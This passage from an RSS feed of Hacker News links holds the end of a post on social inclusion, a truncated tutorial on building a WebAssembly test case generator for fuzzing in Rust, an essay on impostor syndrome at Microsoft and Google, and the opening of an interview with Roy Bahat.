<p>Connection opportunities rise in a nonlinear fashion. You and another person represent one connection. Add two people and there are six potential connections. 100 people represent 4,950 potential unique connections.<sup data-mfn="1">1</sup><span data-mfn="1">100! / (98! * 2!)</span> Emergence occurs.</p>



<blockquote><p>Emergence occurs when an entity is observed to have properties its parts do not have on their own.</p></blockquote>



<p>The same Derek Sivers (and first follower Gregory Brown) started a movement called <a href="https://nownownow.com/about" target="_blank" rel="noreferrer noopener nofollow">the /now page</a>. It inspired me to create my own <a href="https://jonathanliu.me/now/" target="_blank" rel="noreferrer noopener nofollow">now page</a>, which I submitted for inclusion. While browsing the collection of now pages, <a href="https://www.swyx.io/now/" target="_blank" rel="noreferrer noopener nofollow">swyx’s</a> (Shawn Wang) caught my eye. I tweeted a particularly insightful paragraph from one of his essays:</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">"Like it or not, people want to put you in a box. Help them put you in an expensive, high-sentimental-value, glittering, easy to reach box. Preferably at eye level, near Checkout, next to other nice looking boxes." – <a href="https://twitter.com/swyx?ref_src=twsrc%5Etfw">@swyx</a></p>— Jonathan 🇺🇲🇨🇦 (@jonathanliu) <a href="https://twitter.com/jonathanliu/status/1290304867408310273?ref_src=twsrc%5Etfw">August 3, 2020</a></blockquote>
</div></figure>



<p>Now we’re <a href="https://twitter.com/Mappletons/status/1294603898595037186" target="_blank" rel="noreferrer noopener nofollow">weak ties on Twitter</a>.</p>



<h4>Reciprocity</h4>



<blockquote><p>Simply put, people are obliged to give back to others the form of a behavior, gift, or service that they have received first.</p><cite>Robert Cialdini</cite></blockquote>



<p>By letting people into your group, you’re doing them a favor. In return, they’ll feel obliged to return the favor in whatever way they can. At the very least, they’ll like you more. People who like you will attribute all kinds of positive qualities to you. And they’ll speak highly of you when you’re not around, bolstering your reputation.</p>



<p>I use Derek and Shawn as examples primarily because I admire their work, but partially because they included me. Conversely, I would never employ a follow-unfollow strategy to grow a Twitter audience. Your follower count will receive an artificial boost, but at what cost? Engaged users will be left with a negative impression.</p>



<p>You can benefit from reciprocity by including people even if you didn’t start the group. Much like <a href="https://jonathanliu.me/the-attribution-of-ideas/" target="_blank" rel="noreferrer noopener">the attribution of ideas</a>, people attribute their group membership to the person who initially welcomed them in.</p>







<p>One concern is that a group with zero standards will suffer from value dilution. I am not suggesting that anyone and everyone be included. I am merely recommending that you err on the side of inclusion rather than exclusion. If you’re cool, so are your fans.</p>



<p><em>Mean Girls</em> ends with Cady Heron winning Spring Fling queen, snapping the crown into many pieces, and sharing it with her classmates.<sup data-mfn="2">2</sup><span data-mfn="2"><strong>Spoiler warning.</strong> By the way, Snape kills Dumbledore.</span> Be like (reformed) Cady.</p>



<p>Featured photo by <a href="https://unsplash.com/@theluckyneko" target="_blank" rel="noreferrer noopener nofollow">Millie Wollney</a>.</p>

		</div>

	
	
</article></div>]]>
            </description>
            <link>https://jonathanliu.me/you-can-sit-with-us/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24263536</guid>
            <pubDate>Mon, 24 Aug 2020 18:11:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mbuffer is a tool for buffering data streams with a large set of unique features]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24263526">thread link</a>) | @ZnZirconium
<br/>
August 24, 2020 | http://www.maier-komor.de/mbuffer.html | <a href="https://web.archive.org/web/*/http://www.maier-komor.de/mbuffer.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.maier-komor.de/mbuffer.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24263526</guid>
            <pubDate>Mon, 24 Aug 2020 18:10:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Biostatistics: A review sheet [5 pages] [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24263285">thread link</a>) | @R3G1R
<br/>
August 24, 2020 | https://mathvault.ca/wp-content/uploads/Biostatistics-Review.pdf | <a href="https://web.archive.org/web/*/https://mathvault.ca/wp-content/uploads/Biostatistics-Review.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://mathvault.ca/wp-content/uploads/Biostatistics-Review.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24263285</guid>
            <pubDate>Mon, 24 Aug 2020 17:50:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a Test Case Generator for a Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24263117">thread link</a>) | @azhenley
<br/>
August 24, 2020 | http://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html | <a href="https://web.archive.org/web/*/http://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Maxime Chevalier-Boisvert requested resources for learning about fuzzing
programming language implementations on Twitter:</p>

<blockquote>
  <p>I’d like to learn about fuzzing, specifically fuzzing programming language
implementations. Do you have reading materials you would recommend, blog
posts, papers, books or even recorded talks?</p>
</blockquote>

<p><cite><a href="https://twitter.com/Love2Code">@Love2Code</a> · <a href="https://twitter.com/Love2Code/status/1290363848885776385">August 3,
2020</a></cite></p>

<p>Maxime received many replies linking to informative papers, blog posts, and
lectures. <a href="https://twitter.com/johnregehr/status/1290368969199636480">John Regehr suggested writing a simple generative fuzzer for the
programming
language.</a></p>

<p>A generative fuzzer combines a test case generator with the system under test
(e.g. your compiler), generating new test cases and feeding them into the
system:</p>

<figure><pre><code data-lang="rust"><span>fn</span> <span>generative_fuzzer</span><span>()</span> <span>{</span>
    <span>loop</span> <span>{</span>
        <span>// Use the test case generator to create a new</span>
        <span>// input.</span>
        <span>let</span> <span>input</span> <span>=</span> <span>generate_test_case</span><span>();</span>

        <span>// Feed that input into the system under test.</span>
        <span>let</span> <span>result</span> <span>=</span> <span>run_system_under_test</span><span>(</span><span>input</span><span>);</span>

        <span>// Finally, if the system under test crashed,</span>
        <span>// failed an assertion, etc... then report</span>
        <span>// that!</span>
        <span>if</span> <span>result</span><span>.is_interesting</span><span>()</span> <span>{</span>
            <span>report</span><span>(</span><span>input</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span></code></pre></figure>

<p>I realized that many people might not know what it takes to write their own
generative fuzzer, so this blog post shows one aspect of it: implementing a test
case generator.</p>

<p>Our test case generator will generate <a href="https://webassembly.org/">WebAssembly</a> programs. While
WebAssembly has its own quirks — it’s a binary format and is generally a
compilation target rather than a source language — it is a small and
simple language. The techniques we use when generating WebAssembly should
transfer to generating the programming language of your choice.</p>

<p>If you want to skip the exposition and jump head first into the code, <a href="https://github.com/fitzgen/wasm-smith">here is
the repository for our final test case generator</a>.</p>

<h2 id="table-of-contents">Table of Contents</h2>

<ul>
  <li><a href="#what-is-a-test-case-generator">What is a Test Case Generator?</a></li>
  <li><a href="#getting-set-up">Getting Set Up</a></li>
  <li><a href="#translating-grammars-into-generators">Translating Grammars into Generators</a></li>
  <li><a href="#generating-the-type-section">Generating the Type Section</a></li>
  <li><a href="#generating-the-import-section">Generating the Import Section</a></li>
  <li><a href="#generating-the-code-section">Generating the Code Section</a></li>
  <li><a href="#using-the-test-case-generator">Using the Test Case Generator</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="what-is-a-test-case-generator">What is a Test Case Generator?</h2>

<p>Test case generators generate test cases. These test cases are always within the
test domain: no cycles are wasted on invalid inputs, such as source text that
fails to parse. Compare this to <a href="https://www.fuzzingbook.org/beta/html/MutationFuzzer.html">mutation-based fuzzing</a>, where existing seed
inputs are mutated to produce new inputs. In general, nothing guarantees that
the new, mutated input is still within the test domain: the mutation may have
introduced a syntax error. This property, that generated inputs are always
within the test domain, is generative fuzzing’s main advantage and the test case
generator’s main responsibility.</p>

<p>A test case generator should, additionally, support every feature of its target
programming language. You won’t discover a bug in your compiler’s handling of
<code>switch</code> statements if the test case generator doesn’t support generating
<code>switch</code> statements. Pushing this idea even further, the test case generator
should <em>uniformly sample</em> from the test domain. If the test case generator can
technically generate <code>switch</code> statements but the probability of doing so is
nearly zero, then you likely still won’t find that bug. However, uniformly
sampling from the infinite set of all programs that can be written in a
particular programming language is
<a href="https://blog.regehr.org/archives/1700">nontrivial</a> and an area of
<a href="https://arxiv.org/pdf/0807.0992v1.pdf">active</a>
<a href="https://havrikov.github.io/publications/ase19-preprint.pdf">research</a>.</p>

<p>A test case generator should, finally, be fast. The faster we can generate test
cases, the faster we will discover bugs. If the generator is too slow, we can
blow our time budget, failing to find those bugs at all.</p>

<h2 id="getting-set-up">Getting Set Up</h2>

<p>First, we create a new crate with <code>cargo</code>. We’ll name this crate <code>wasm-smith</code>,
giving a little nod to <a href="https://embed.cs.utah.edu/csmith/">Csmith</a>, the popular C program generator.</p>

<figure><pre><code data-lang="shell"><span>$ </span>cargo new <span>--lib</span> wasm-smith</code></pre></figure>

<p>Second, we add <a href="https://github.com/rust-fuzz/arbitrary">the <code>arbitrary</code> crate</a> as a dependency:</p>

<figure><pre><code data-lang="toml"><span># wasm-smith/Cargo.toml</span>

<span>[dependencies]</span>
<span>arbitrary</span> <span>=</span> <span>{</span> <span>version</span> <span>=</span> <span>"0.4.6"</span><span>,</span> <span>features</span> <span>=</span> <span>["derive"]</span> <span>}</span></code></pre></figure>

<p>The <code>arbitrary</code> crate helps us generate structured data from arbitrary bytes. It
is typically used in combination with <a href="https://llvm.org/docs/LibFuzzer.html">libFuzzer</a> to translate the raw bytes
given to use by libFuzzer into something that the system you’re testing can
process. For example, a color conversion library might use <code>arbitrary</code> to turn
the raw fuzzer-provided bytes into <code>Rgb</code> or <code>Hsl</code> color types. We will use it in
a similar way for this project, translating raw bytes given to us by libFuzzer
into semantically valid WebAssembly modules.</p>

<p>The <code>arbitrary</code> crate’s main export is <a href="https://docs.rs/arbitrary/0.4.5/arbitrary/trait.Arbitrary.html">the <code>Arbitrary</code> trait</a>:</p>

<figure><pre><code data-lang="rust"><span>pub</span> <span>trait</span> <span>Arbitrary</span><span>:</span> <span>Sized</span> <span>+</span> <span>'static</span> <span>{</span>
    <span>fn</span> <span>arbitrary</span><span>(</span><span>u</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Unstructured</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Self</span><span>&gt;</span><span>;</span>

    <span>// Provided methods hidden...</span>
<span>}</span></code></pre></figure>

<p>It takes an <a href="https://docs.rs/arbitrary/0.4.5/arbitrary/struct.Unstructured.html"><code>Unstructured</code></a>, which is a helpful wrapper around a byte slice, and
returns an instance of the type for which it is implemented.</p>

<p>For our <code>wasm-smith</code> crate, we define a <code>Module</code> type that represents our
pseudo-random WebAssembly modules, and then we implement the <code>Arbitrary</code> trait
for it:</p>

<figure><pre><code data-lang="rust"><span>use</span> <span>arbitrary</span><span>::{</span><span>Arbitrary</span><span>,</span> <span>Result</span><span>,</span> <span>Unstructured</span><span>};</span>

<span>/// A pseudo-random WebAssembly module.</span>
<span>pub</span> <span>struct</span> <span>Module</span> <span>{</span>
    <span>// ...</span>
<span>}</span>

<span>impl</span> <span>Arbitrary</span> <span>for</span> <span>Module</span> <span>{</span>
    <span>fn</span> <span>arbitrary</span><span>(</span><span>u</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Unstructured</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Self</span><span>&gt;</span> <span>{</span>
        <span>todo!</span><span>()</span>
    <span>}</span>
<span>}</span></code></pre></figure>

<p>Before we fill in that <code>todo!()</code> lets take a moment to settle on a design for
what the implementation will look like.</p>

<h2 id="translating-grammars-into-generators">Translating Grammars into Generators</h2>

<p>Writing a generator is remarkably similar to hand-writing a <a href="https://en.wikipedia.org/wiki/Recursive_descent_parser">recursive descent
parser</a>, so if you’ve done that before, then you should feel right at home. For
example, given this grammar production (borrowed and lightly edited from <a href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#mangling">the
C++ name mangling</a> grammar):</p>

<pre><code>&lt;class-enum-type&gt; ::= Ts &lt;name&gt;
                    | Tu &lt;name&gt;
                    | Te &lt;name&gt;
</code></pre>

<p>A recursive descent parser will, almost mechanically, translate the production
into something like this:</p>

<figure><pre><code data-lang="rust"><span>impl</span> <span>Parse</span> <span>for</span> <span>ClassEnumType</span> <span>{</span>
    <span>fn</span> <span>parse</span><span>(</span><span>p</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Parser</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Self</span><span>&gt;</span> <span>{</span>
        <span>// Ts &lt;name&gt;</span>
        <span>if</span> <span>p</span><span>.peek</span><span>(</span><span>"Ts"</span><span>)</span> <span>{</span>
            <span>p</span><span>.consume</span><span>(</span><span>"Ts"</span><span>)</span><span>?</span><span>;</span>
            <span>let</span> <span>name</span> <span>=</span> <span>Name</span><span>::</span><span>parse</span><span>(</span><span>p</span><span>)</span><span>?</span><span>;</span>
            <span>return</span> <span>Ok</span><span>(</span><span>ClassEnumType</span><span>::</span><span>Ts</span><span>(</span><span>name</span><span>));</span>
        <span>}</span>

        <span>// Tu &lt;name&gt;</span>
        <span>if</span> <span>p</span><span>.peek</span><span>(</span><span>"Tu"</span><span>)</span> <span>{</span>
            <span>p</span><span>.consume</span><span>(</span><span>"Tu"</span><span>)</span><span>?</span><span>;</span>
            <span>let</span> <span>name</span> <span>=</span> <span>Name</span><span>::</span><span>parse</span><span>(</span><span>p</span><span>)</span><span>?</span><span>;</span>
            <span>return</span> <span>Ok</span><span>(</span><span>ClassEnumType</span><span>::</span><span>Tu</span><span>(</span><span>name</span><span>));</span>
        <span>}</span>

        <span>// Te &lt;name&gt;</span>
        <span>p</span><span>.consume</span><span>(</span><span>"Te"</span><span>)</span><span>?</span><span>;</span>
        <span>let</span> <span>name</span> <span>=</span> <span>Name</span><span>::</span><span>parse</span><span>(</span><span>p</span><span>)</span><span>?</span><span>;</span>
        <span>Ok</span><span>(</span><span>ClassEnumType</span><span>::</span><span>Te</span><span>(</span><span>name</span><span>))</span>
    <span>}</span>
<span>}</span></code></pre></figure>

<p>Our generator will do something similar, except instead of peeking at the input
string to decide which right-hand side of the production to parse, we will make
a pseudo-random choice to generate one of those potential right hand sides.</p>

<p>We could use a random number generator directly to make these choices, but this
has two problems:</p>

<ol>
  <li>
    <p>We give up determinism unless we are careful to control the RNG’s seed and
reuse the same RNG everywhere, threading it through all of our functions as a
parameter. Determinism is extremely important for reproducing test failures!
It’s definitely possible to do these things, but can occasionally be a little
annoying.</p>
  </li>
  <li>
    <p>More importantly, using an RNG precludes a mature fuzzing engine, like
libFuzzer, from guiding our test case generation based on code coverage and
other insights.</p>
  </li>
</ol>

<p>Instead, we use a raw input byte slice given to us by libFuzzer or AFL as a
sequence of predetermined choices.<sup id="back-dont-require-libfuzzer"><a href="#foot-dont-require-libfuzzer">0</a></sup> This <a href="https://arxiv.org/pdf/1812.00078v1.pdf">lets the fuzzer guide our
test case generation</a>, and <a href="https://drmaciver.github.io/papers/reduction-via-generation-preview.pdf">gives us test case reduction “for
free”</a> since we can ask the fuzzer to reduce the raw input
sequence, rather than write a domain-specific test case reducer. This comes as a
relief because writing a reducer that understands WebAssembly is easily as much
effort as writing the generator itself.</p>

<p>Here is the same C++ mangling example from above, but translated from a parser
into a generator, using <code>Unstructured</code>:</p>

<figure><pre><code data-lang="rust"><span>fn</span> <span>arbitrary_class_enum_type</span><span>(</span>
    <span>u</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Unstructured</span><span>,</span>
    <span>output</span><span>:</span> <span>&amp;</span><span>mut</span> <span>String</span><span>,</span>
<span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>()</span><span>&gt;</span> <span>{</span>
    <span>match</span> <span>u</span><span>.int_in_range</span><span>::</span><span>&lt;</span><span>u8</span><span>&gt;</span><span>(</span><span>0</span><span>..=</span><span>2</span><span>)</span> <span>{</span>
        <span>// Ts &lt;name&gt;</span>
        <span>0</span> <span>=&gt;</span> <span>{</span>
            <span>output</span><span>.push_str</span><span>(</span><span>"Ts"</span><span>);</span>
            <span>arbitrary_name</span><span>(</span><span>u</span><span>,</span> <span>output</span><span>)</span><span>?</span><span>;</span>
            <span>Ok</span><span>(())</span>
        <span>}</span>
        <span>// Tu &lt;name&gt;</span>
        <span>1</span> <span>=&gt;</span> <span>{</span>
            <span>output</span><span>.push_str</span><span>(</span><span>"Tu"</span><span>);</span>
            <span>arbitrary_name</span><span>(</span><span>u</span><span>,</span> <span>output</span><span>)</span><span>?</span><span>;</span>
            <span>Ok</span><span>(())</span>
        <span>}</span>
        <span>// Te &lt;name&gt;</span>
        <span>2</span> <span>=&gt;</span> <span>{</span>
            <span>output</span><span>.push_str</span><span>(</span><span>"Te"</span><span>);</span>
            <span>arbitrary_name</span><span>(</span><span>u</span><span>,</span> <span>output</span><span>)</span><span>?</span><span>;</span>
            <span>Ok</span><span>(())</span>
        <span>}</span>
        <span>_</span> <span>=&gt;</span> <span>unreachable!</span><span>(),</span>
    <span>}</span>
<span>}</span></code></pre></figure>

<p>Once again, this is mostly mechanical.</p>

<p>This pattern will generate <em>syntactically</em> correct test cases that can be parsed
successfully but which likely contain a plethora of type errors, calls to
undefined functions, etc. We’ve set out to generate <em>semantically</em> correct test
cases that pass type checking and will exercise more than just the language
implementation’s frontend.</p>

<p>Our final pattern maintains some extra information about the program we’ve
generated thus far, so that we can consult that information when generating new
forms. This extra information might include which names are in scope, the types
of each variable, etc. We consult that information while dynamically building up
thunks for every valid option we could generate. Once we have enumerated every
option, we ask the <code>Unstructured</code> to choose one of them, and finally we call the
chosen thunk to generate the form.</p>

<p>Here is an example of using this pattern for generating integer expressions,
where an integer expression is either a constant integer, an arithmetic
operation, a use of an integer variable, or a call of a function that returns an
integer:</p>

<figure><pre><code data-lang="rust"><span>fn</span> <span>arbitrary_int_expr</span><span>(</span>
    <span>u</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Unstructured</span><span>,</span>
    <span>scope</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Scope</span><span>,</span>
<span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
    <span>// We will dynamically build up all of the valid</span>
    <span>// options of what we can generate.</span>
    <span>let</span> <span>mut</span> <span>options</span><span>:</span> <span>Vec</span><span>&lt;</span><span>fn</span> <span>(</span>
        <span>&amp;</span><span>mut</span> <span>Unstructured</span><span>,</span>
        <span>&amp;</span><span>mut</span> <span>Scope</span><span>,</span>
    <span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Expr</span><span>&gt;&gt;</span> <span>=</span> <span>vec!</span><span>[];</span>

    <span>// It is always valid to generate a constant.</span>
    <span>options</span><span>.push</span><span>(|</span><span>u</span><span>,</span> <span>_</span><span>|</span> <span>{</span>
        <span>Ok</span><span>(</span><span>Expr</span><span>::</span><span>Constant</span><span>(</span><span>u</span><span>.arbitrary</span><span>::</span><span>&lt;</span><span>i32</span><span>&gt;</span><span>()</span><span>?</span><span>))</span>
    <span>});</span>

    <span>// It is always valid to generate an addition.</span>
    <span>options</span><span>.push</span><span>(|</span><span>u</span><span>,</span> <span>scope</span><span>|</span> <span>{</span>
        <span>let</span> <span>lhs</span> <span>=</span> <span>arbitrary_int_expr</span><span>(</span><span>u</span><span>,</span> …</code></pre></figure></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">http://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html</a></em></p>]]>
            </description>
            <link>http://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24263117</guid>
            <pubDate>Mon, 24 Aug 2020 17:36:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Impostor's Advantage]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24263114">thread link</a>) | @Cyphase
<br/>
August 24, 2020 | https://www.zainrizvi.io/blog/the-impostors-advantage/ | <a href="https://web.archive.org/web/*/https://www.zainrizvi.io/blog/the-impostors-advantage/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->


				<div>
					<p>My heart was racing. My palms sweating. I was going to be fired.</p><p>Performance reviews had just ended, and it was time to meet my manager and be told my results. Except I knew what it would say. How else do you rate a programmer who doesn’t code?</p><p>As I stood up from my desk, my eyes fell on my Ship-it plaque, congratulating me for helping release Windows 7. I had joined Microsoft a mere two weeks before it was released, a fresh college hire. There wasn’t a single character I had contributed to that code.</p><p>The plaque was a lie. Just like me.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/08/cropped-plaque.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/08/cropped-plaque.png 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/08/cropped-plaque.png 1000w, https://www.zainrizvi.io/content/images/2020/08/cropped-plaque.png 1325w" sizes="(min-width: 720px) 720px"></figure><p>My manager had booked a private conference room to share the results, far away from ears that might overhear anything said. Or begged. The long walk began, each step echoing down the corridor.</p><p>I racked my brains, grasping for an excuse to justify keeping my job. Instead my mind kept going back to the last bug I was supposed to fix. I’d spent all day failing to find the problem, finally giving in and asking a teammate for help. He found it in 10 minutes. I was way out of my league.</p><p>My boss must have seen it too, I bet that was why he assigned me, the kid, to help government auditors analyze our source code. Help <em>them</em>? I barely understood it myself! But this was more of a “people project.” If it didn’t require writing code, why waste real programmers on it? And so it came to me. I barely stayed afloat, constantly asking my manager for explanations and struggling to relay them to the auditors.</p><p>Yeah, I was doomed.</p><p>How would I tell my parents? Would I ever get another job? The only coding I did here was with an obsolete technology that no other company cared about; I didn’t even have the skills to land a new job.</p><p>What made me think I could work at Microsoft?</p><p>I reached the conference room, could I stall any longer? Huh, It’s the same room he interviewed me in two years ago. I doubt he remembers.</p><p>Okay, this is it. Deep breath, poker face on. No matter what, I wouldn’t let him <a href="https://www.zainrizvi.io/blog/the-interviewing-advice-no-one-shares#tip-3-be-open-to-learning-during-the-interview">see me sweat</a>.</p><p>I stepped inside. Scott was sitting at the table, laptop carefully angled to hide the screen.</p><p>“Have a seat” he said, gesturing to his right. As I sat down, Scott looked straight at me. He opened his mouth to give me the news. But it wasn’t what I expected.</p><p>“Congratulations, you’ve been promoted”</p><p>Huh? No way I heard that right. Keep that poker face tight.</p><p>“Keep up the great work! Anything you’d like to ask?”</p><p>Wait but...when did I...what?</p><p>He hadn’t noticed? I wasn’t about to point out his mistake. Can’t let any surprise show.</p><p>“Great, thanks.” That was all I trusted myself to say.</p><p>I was safe. For now.</p><p>He’d catch on in a few months, I was sure. I couldn’t hide forever.</p><p>I spent the next few years preparing for that inevitable day, desperately trying to work on projects that could teach me the skills that would catch a recruiter’s eye. I had to become hireable.</p><p>I needed a stronger resume, with skills people cared about. I switched to a new team which built stuff for the cloud: Azure Web Apps. Companies love the cloud, right? Surely I’ll learn industry relevant skills there.</p><p>Fast forward four years: I still didn’t feel like I was anything special, yet I kept getting promoted. I kept fooling them somehow, the <a href="https://www.zainrizvi.io/blog/hacking-the-bureaucracy-to-get-stuff-done/">bureaucratic</a> review process hiding my flaws. But something else also started happening, hinting that, just maybe, I wasn’t as clueless as I thought.</p><p>What changed?</p><p>People started coming to me for answers.</p><p>I still didn’t feel like I knew that much. I was just telling people about the stuff I’d worked on, occasionally pointing younger engineers towards tactics I had seen work well. That didn’t feel like anything original, but folks were finding it useful.</p><p>It got really weird when the more senior engineers started asking <em>me </em>about the code base. These were brilliant people who had often helped me over the years. Didn’t they already know everything?</p><p>I guess not, but they were still way above my league. It’s not like I knew enough to offer <em>them </em>real advice.</p><p>But still...my team seemed to think I was doing well. Would other companies think so too? Was I finally hireable? Only one way to find out: I started <a href="https://www.zainrizvi.io/blog/the-interviewing-advice-no-one-shares">applying</a>.</p><p>I couldn’t believe the results when multiple job offers came in. And one was from Google! I couldn’t pass that one up. I made the switch.</p><p>During orientation, Google spent a lot of time discussing Impostor Syndrome, the feeling of accomplished people belittling their own talents and constantly being terrified of being discovered as a fraud. That’s a thing?</p><p>“Raise your hand if you have this feeling” Hah, yeah right, and have me be the only one raising my...oh, wow, that’s a lot of hands. Mine joined the crowd.</p><p>As I started working, impostor syndrome came up constantly. It was mentioned at company meetings, folks made memes admitting to it. It was everywhere.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/08/when-someone-comments-on-my-design-doc.gif" alt=""></figure><p>People freely admitted to not knowing stuff. Teammates admitted to not understanding the code, or having no idea how a tool worked. All the stuff I didn’t know, many others didn’t get either.</p><p>Seeing everyone admit their ignorance <strong>freed me</strong> from my own fear. Suddenly, feeling clueless seemed normal. &nbsp;It was a psychological quirk, not the truth.</p><p>My self-confidence grew. And gradually, without quite realizing it, something magical happened.</p><p>Impostor syndrome became a tool. I discovered the <strong>impostor’s advantage</strong>.</p><p>Did I notice feeling intimidated about asking a question? I started pushing myself to ask that question. Turns out other people had felt afraid as well, asking that question helped improve everyone’s understanding. &nbsp;When I started openly admitting to being unfamiliar with a tool or some code, my teammates felt like less of an impostor themselves. Their confidence went up. And they in turn became more likely to admit the same, creating a virtuous cycle boosting the entire team’s morale.</p><p>The impostor’s advantage was a super power.</p><p>And it offered new insights.</p><p>That feeling of being an impostor is your subconscious telling you something: It’s saying you’re about to push yourself past your comfort zone and into the growth zone. Now when an opportunity shows up and impostor syndrome starts twitching in the pit of my stomach, <strong>that’s a sign I should jump at it!</strong> This led me to take on <a href="https://www.zainrizvi.io/blog/whats-it-like-as-a-senior-engineer/#research-like-a-detective">bigger and more ambitious</a> projects, without worrying about being exposed. Somehow I still delivered results, helped by the various people I was no longer afraid to reach out to.</p><p>Every project still started with the thought, “I have no idea what to do here.” But then I’d remind myself, “no one else does either.” That was a surprising lesson about the more senior positions: <strong>Their work is so valuable </strong><em><strong>precisely because </strong></em><strong>no one knows exactly what needs to be done. It’s ambiguous.</strong> And it requires people who can still push through the uncertainty and forge a path forward.</p><p>They embrace the impostor’s advantage.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/08/i-feel-like-an-impostor.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/08/i-feel-like-an-impostor.png 600w, https://www.zainrizvi.io/content/images/2020/08/i-feel-like-an-impostor.png 666w"></figure><p>Looking back, I realize now that in my early days I'd been evaluating myself with biased glasses. &nbsp;<strong>I was comparing myself to people much more senior than me</strong>. Of course there would be a skill gap. <strong>If one person understood something, I assumed everyone knew it</strong>. That was false. As the “systems grow it’s impossible for one person to keep it all in their head”[1]; each person just knew the areas they had personally worked on.</p><p>My biggest mistake: <strong>I didn’t value the soft skills I brought to the table</strong>. Fresh out of college I had taken a significant load off my manager's plate by being the main point of contact with auditors and other teams. The fact that I was not writing code made me think I wasn’t doing anything useful, when in fact the soft skill of being able to work with them was incredibly valuable to the team.</p><p>As I continue working and taking on bigger projects, I suspect impostor syndrome will never completely go away. But now I take that as a good thing. An advantage. It’s a sign that I’m growing and stretching myself past my comfort zone.</p><p>And in thost darkest moments, when self doubt is at its highest, I remind myself:</p><p>I haven’t been fired yet.</p><p>[1] <em><a href="https://www.amazon.com/Managers-Path-Leaders-Navigating-Growth/dp/1491973897https://www.amazon.com/Managers-Path-Leaders-Navigating-Growth/dp/1491973897">The Manager’s Path</a></em>, by &nbsp;Camille Fournier</p>
				</div><!-- .post-content -->
				<!-- .post-footer -->
				<!-- .comments-area -->


		</article></div>]]>
            </description>
            <link>https://www.zainrizvi.io/blog/the-impostors-advantage/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24263114</guid>
            <pubDate>Mon, 24 Aug 2020 17:36:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Talking Resilience with Roy Bahat of Bloomberg Beta]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24263090">thread link</a>) | @RoboCornell88
<br/>
August 24, 2020 | https://www.range.co/blog/talking-resilience-with-roy-bahat-of-bloomberg-beta | <a href="https://web.archive.org/web/*/https://www.range.co/blog/talking-resilience-with-roy-bahat-of-bloomberg-beta">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p>Our <strong>12 Questions</strong> series takes you into the minds of influential leaders to discuss today’s hot topics. Read their fresh views on leadership, managing through change, and the ins and outs of modern work. Think of it as your office hours with some of the most innovative people in business.</p><p>We continue this series on resilience with <a href="https://www.linkedin.com/in/roybahat/" rel="noopener" target="_self">Roy Bahat</a>. Roy is the head of Bloomberg Beta, a venture fund backed by Bloomberg L.P. that invests in companies that make business work better. Roy has been an entrepreneur (started a venture-backed video game console), a public company executive (at News Corporation), a board member for companies and nonprofits, and in government (in his hometown of New York). When he’s not teaching media at U.C. Berkeley’s Haas School of Business or investing in the future of work, he’s also not sharing advice on <a href="https://twitter.com/roybahat" rel="noopener" target="_self">Twitter</a>.</p><hr><p><strong>Thanks for joining us for 12 Questions, Roy. Can you describe your career in twelve words or less</strong></p><p>A determined random walk that only became clear in retrospect.<br></p><p><strong>That's very meta. Do you want to expand on that mental image?</strong></p><p>Sure. I was always jealous of the people who knew what they wanted to do. I had to work in a bunch of settings to figure out where my home was: from nonprofit, academia, and government to professional services, startups, and big corporations. 